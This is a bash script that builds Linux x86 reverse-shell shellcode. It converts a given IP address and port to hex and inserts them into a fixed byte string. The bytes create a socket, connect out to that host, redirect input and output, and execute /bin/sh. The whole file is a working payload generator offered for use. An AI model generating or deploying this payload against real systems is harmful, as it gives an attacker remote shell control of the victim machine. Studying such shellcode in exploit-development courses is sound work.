#!/bin/bash

# Get the ip address as input
ip_address=$1

ip_1=$(echo $ip_address | awk -F '.' '{print$1}')
ip_2=$(echo $ip_address | awk -F '.' '{print$2}')
ip_3=$(echo $ip_address | awk -F '.' '{print$3}')
ip_4=$(echo $ip_address | awk -F '.' '{print$4}')

ip_hex1=$(echo "obase=16; $ip_1" | bc)
ip_hex2=$(echo "obase=16; $ip_2" | bc)
ip_hex3=$(echo "obase=16; $ip_3" | bc)
ip_hex4=$(echo "obase=16; $ip_4" | bc)

if [ $(echo $ip_hex1 | wc -c) == 2 ]
then
	ip_hex1=$(echo $ip_hex1 | sed 's/^/0/')
fi

if [ $(echo $ip_hex2 | wc -c) == 2 ]
then
	ip_hex2=$(echo $ip_hex2 | sed 's/^/0/')
fi

if [ $(echo $ip_hex3 | wc -c) == 2 ]
then
	ip_hex3=$(echo $ip_hex3 | sed 's/^/0/')
fi

if [ $(echo $ip_hex4 | wc -c) == 2 ]
then
	ip_hex4=$(echo $ip_hex4 | sed 's/^/0/')
fi

echo '[+] The HEX translation of the ip address inserted:'
echo $ip_hex4 $ip_hex3 $ip_hex2 $ip_hex1
# port
port_hex=$(echo "obase=16; $2" | bc | sed 's/.\{2\}$/:&/')
port_hex1=$(echo $port_hex | awk  -F ':' '{print$2}')
port_hex2=$(echo $port_hex | awk  -F ':' '{print$1}')

if [ $(echo $port_hex1 | wc -c) == 2 ]
then
	port_hex1=$(echo $port_hex1 | sed 's/^/0/')
fi

if [ $(echo $port_hex2 | wc -c) == 2 ]
then
	port_hex2=$(echo $port_hex2 | sed 's/^/0/')
fi

echo '[+] The Port translation to hex:'
echo $port_hex1
echo $port_hex2

echo -e '[+] The crafted shellcode:'


shellcode="\x31\xdb\xf7\xe3\xb0\x66\xb3\x01\x52\x53\x6a\x02\x89\xe1\xcd\x80\x89\xc7\x31\xdb\xf7\xe3\xb0\x66\xb3\x03\x68\x$ip_hex1\x$ip_hex2\x$ip_hex3\x$ip_hex4\x66\x68\x$port_hex2\x$port_hex1\x66\x6a\x02\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\x5b\x31\xc0\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xdb\xf7\xe3\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xd1\xb0\x0b\xcd\x80"





echo $shellcode

